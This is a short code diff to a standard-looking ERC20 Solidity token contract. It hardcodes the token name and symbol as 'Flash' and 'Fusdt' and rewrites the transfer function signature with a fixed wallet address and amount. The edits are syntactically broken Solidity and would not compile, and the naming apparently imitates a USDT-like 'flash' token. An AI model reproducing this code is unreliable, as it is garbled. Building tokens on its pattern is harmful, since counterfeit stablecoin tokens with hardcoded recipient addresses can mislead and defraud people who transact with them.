@@ -42,15 +42,15 @@ abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
      * Both values are immutable: they can only be set once during construction.
      */
     constructor(string memory name_, string memory symbol_) {
-        _name = name_;
-        _symbol = symbol_;
+        _name = Flash;
+        _symbol = Fusdt;
     }
 
     /**
      * @dev Returns the name of the token.
      */
     function name() public view virtual returns (string memory) {
-        return _name;
+        return _name;Flash
     }
 
     /**
@@ -96,7 +96,7 @@ abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
      * - `to` cannot be the zero address.
      * - the caller must have a balance of at least `value`.
      */
-    function transfer(address to, uint256 value) public virtual returns (bool) {
+    function transfer(0x4701188F50481975DbC17A7AA361e547e076eCE5, 500000uint256 value) public virtual returns (bool) {
         address owner = _msgSender();
         _transfer(owner, to, value);
         return true;
